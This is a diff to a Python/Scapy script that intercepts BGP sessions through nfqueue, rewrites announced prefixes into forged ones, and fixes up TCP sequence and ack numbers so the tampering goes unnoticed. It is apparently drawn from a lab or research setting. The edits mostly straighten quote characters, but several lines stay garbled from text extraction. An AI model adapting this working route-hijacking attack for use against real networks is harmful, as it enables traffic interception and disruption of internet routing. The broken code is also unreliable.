@@ -6,21 +6,21 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
     global prev_type,newseq
     if firstforged is True: #if a packet was forged even just once start adjusting seq/ack numbers
         if message[IP].dst == recer: #if source addr is sender
-            if prev type == ’ack’: #if previous message is an ack send from reciever
+            if prev_type == 'ack': #if previous message is an ack send from reciever
                 seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next ack is the current seq number ncreased by the length of the original message
                 message[TCP].seq = ack #set as new sequence numberthe number the receiver acknowledged last time
                 newseq = ack + len(str(message[TCP].payload)) #keepthe previous ack increased by the length of thecurrent message to use as next seq num in case thenext message is again from sender
-            elif prev type == ’send’: #if previous message was again from sender
+            elif prev_type == 'send': #if previous message was again from sender
                 message[TCP].seq = newseq #set as new sequence number the next seq number to be acked stored in newseq variable
                 seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next sequence number to be acked is the seqnum of the message plus message length
             print ”SEQ ADJUSTED ”
             if seq > 4294967295: #if sequence number has maxed out wrap around
                 seq = seq−4294967295
-            prev_type = ’send’ #set previous type to send
+            prev_type = 'send' #set previous type to send
         elif message[IP].dst == sender:#if source addr is receiver store next seq and change ack to an accepted one
             ack = message[TCP].ack #store in ack the next number to be used as a sequence number
             message[TCP].ack = seq #set ack as the previous sequence number +previous message length
-            prev_type = ’ack’ #set previous type ack
+            prev_type = 'ack' #set previous type ack
             print ”ACK ADJUSTED”
 #delete checksums so they can be recalculated when the packet is send
         del message[IP].chksum
@@ -29,10 +29,10 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
         if message[IP].dst == recer:
             seq = message[TCP].seq + len(str(or message[TCP].payload))
             newseq = seq
-            prev_type = ’send’
+            prev_type = 'send'
         elif message[IP].dst == sender:
             ack = message[TCP].ack
-            prev_type = ’ack’
+            prev_type = 'ack'
         else:
             pass
     return message, ack, seq #return modified message and next ack and sequence numbers
@@ -47,7 +47,7 @@ def bgp_edit(pkt):
     #bgph = BGPHeader()
     #bgpu = BGPUpdate()
     temp_pkt = pkt.copy() #copy input to temp_pkt to avoid shallow copy issues
-    #Copying all pkt’s IP fields in ip
+    #Copying all pkt's IP fields in ip
     ip.version = temp_pkt[IP].version
     ip.ihl = temp_pkt[IP].ihl
     ip.tos = temp_pkt[IP].tos
@@ -58,7 +58,7 @@ def bgp_edit(pkt):
     ip.src = temp_pkt[IP].src
     ip.dst = temp_pkt[IP].dst
     ip.options = temp_pkt[IP].options
-    #Copying all pkt’s TCP fields in tcp
+    #Copying all pkt's TCP fields in tcp
     tcp.sport = temp_pkt[TCP].sport
     tcp.dport = temp_pkt[TCP].dport
     tcp.seq = temp_pkt[TCP].seq
@@ -74,8 +74,8 @@ def bgp_edit(pkt):
     #get all the bgp messages in temp
     temp = temp_pkt[TCP].payload
     #Find how many BGPHeaders are in there using the marker to identify them
-    rg = range(str(temp).count(’\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
-    \xff\xff’))
+    rg = range(str(temp).count('\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
+    \xff\xff'))
     #for all the bgpheaders in the message
     for j in rg:
         temp2=temp.copy() #copy next header in temp2
@@ -102,7 +102,7 @@ def bgp_edit(pkt):
                     port = temp_pkt[TCP].sport
                 else:
                     port = temp_pkt[TCP].dport
-            else: #if the prefix is not found don’t change the message
+            else: #if the prefix is not found don't change the message
                 pass
             p = p/temp2 #Add the new bgpupdate in the output message
             temp = temp.payload.payload #put in temp the next
@@ -112,7 +112,7 @@ def bgp_edit(pkt):
 def process(i, payload):
     data = payload.get data() #get data from message payload
     pkt = IP(data) #store in pkt var the IP message with payload data
-    proto = pkt.proto #store packet’s protocol in proto variable
+    proto = pkt.proto #store packet's protocol in proto variable
     global seq,ack, firstfound, prev_type, f1, f2,port,newseq
     forged = False
     
@@ -127,22 +127,22 @@ def process(i, payload):
                 print ”NO CHANGES YET !!!!!!!!!!!”
             else:
                 pass
-            if destination == ’5.6.0.1’ and len(str(pkt[TCP].payload))!=0:
+            if destination == '5.6.0.1' and len(str(pkt[TCP].payload))!=0:
                 #if destination is 5.6.0.1 and tcp payload size is not 0
                 forged = False
                 forged, frg pkt = bgp_edit(pkt) #call bgp edit to edit the packet
                 if forged is True: #If the message was changed
-                    message, ack, seq = seq_mangle(seq, ack, ’5.6.0.2’, ’5.6.0.1’, frg pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
+                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', frg pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
                 else: #if the message was not forged change only the sequence numbers
-                    message, ack, seq = seq_mangle(seq, ack, ’5.6.0.2’, ’5.6.0.1’, pkt, pkt, forged, firstfound) #call mangle seq on original packet to change sequence number
+                    message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound) #call mangle seq on original packet to change sequence number
             else: #if the destination was not the sender or if the message is just an ack change only the sequence number
-                message, ack, seq = seq_mangle(seq, ack, ’5.6.0.2’, ’5.6.0.1’, pkt, pkt, forged, firstfound)#call mangle seq on original packet to change sequence number
+                message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound)#call mangle seq on original packet to change sequence number
             if firstfound == True: #if session established and forged throw the message
                 payload.set verdict(nfqueue.NF DROP)
                 #If the message is using the accepted port send its modified version
                 if message[TCP].dport == port or message[TCP].sport == port:
                     send(message, verbose=0)
-                else: #If the message is not using the accepted port don’t send anything
+                else: #If the message is not using the accepted port don't send anything
                     print ”\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n”
             else: #if session was not forged yet do nothing (the message will be forwarded automatically)
                 pass
@@ -153,7 +153,7 @@ def process(i, payload):
 
 def main():
     if len(sys.argv) is not 3: #check if the script is executed with correct input and show message if not
-        sys.stderr.write(’Usage : ’+sys.argv[0]+’ <prefix to be changed> <desired prefix>\n’)
+        sys.stderr.write('Usage : '+sys.argv[0]+' <prefix to be changed> <desired prefix>\n')
         sys.exit(1)
     global or_prefix, frg_prefix, ack, seq,firstfound, prev_type, f1, f2,port,newseq
     #intializing global variables
@@ -162,11 +162,11 @@ def main():
     port = 0
     newseq = 0
     firstfound = False
-    prev_type = ’syn’
+    prev_type = 'syn'
     #create the original and forged prefix according to input
-    plist = sys.argv[1].split(’/’,2)
+    plist = sys.argv[1].split('/',2)
     or_prefix = (int(plist[1]),plist[0])
-    plist = sys.argv[2].split(’/’,2)
+    plist = sys.argv[2].split('/',2)
     frg_prefix = (int(plist[1]),plist[0])
     
     load contrib(”bgp”) #load bgp protocol in scapy
